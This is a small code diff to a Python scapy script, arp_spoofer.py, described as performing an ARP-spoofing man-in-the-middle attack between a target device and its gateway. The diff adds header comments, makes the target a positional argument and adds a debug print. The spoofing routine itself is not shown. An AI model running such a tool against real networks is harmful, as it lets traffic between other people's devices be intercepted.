@@ -1,4 +1,6 @@
 #! /usr/bin/env python
+# arp_spoofer.py - ARP spoofer that performs a man-in-the-middle attack through disguise between chosen two devices.
+# WARNING: Not compatible with Python 2.7
 
 import time
 import scapy.all as scapy
@@ -7,7 +9,7 @@ import argparse
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="Performs a man-in-the-middle attack between two given IP addresses.")
-    parser.add_argument("-t", "--target", dest="target", help="target address of spoofed device")
+    parser.add_argument(dest="target", help="target address of spoofed device")
     parser.add_argument("-g", "--gateway", dest="gateway", help="default gateway for the target device")
     arguments = parser.parse_args()
 
@@ -55,5 +57,6 @@ def perform_spoofing(target_ip, gateway_ip):
 
 
 args = get_arguments()
+print(args)
 target, gateway = args.target, args.gateway
 perform_spoofing(target, gateway)
